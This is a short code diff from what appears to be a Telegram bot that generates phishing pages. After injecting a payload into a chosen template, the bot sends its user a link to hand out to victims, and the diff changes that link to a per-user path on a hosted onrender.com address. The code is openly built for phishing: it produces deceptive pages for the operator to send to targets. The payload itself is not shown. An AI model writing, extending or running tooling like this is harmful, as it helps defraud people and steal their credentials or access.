@@ -67,7 +67,7 @@ def handle_template_selection(message):
     os.makedirs(output_path, exist_ok=True)
 
     if inject_payload_and_save(template_path, output_path, user_id):
-        phishing_url = f"https://notafish-1.onrender.com"
+        phishing_url = f"https://notafish-1.onrender.com/phish/{user_id}"
         bot.send_message(message.chat.id, f"✅ Done!\nSend this link:\n{phishing_url}")
     else:
         bot.send_message(message.chat.id, "❌ Failed to inject payload.")
